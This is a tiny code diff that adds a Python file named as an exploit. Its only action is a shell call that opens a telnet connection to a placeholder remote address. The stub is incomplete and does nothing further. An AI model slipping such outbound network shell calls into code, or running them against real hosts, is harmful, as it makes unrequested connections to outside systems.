@@ -1,0 +1,3 @@
+Exploit:.py
+import os
+os.system("telnet REMOTEADDR")
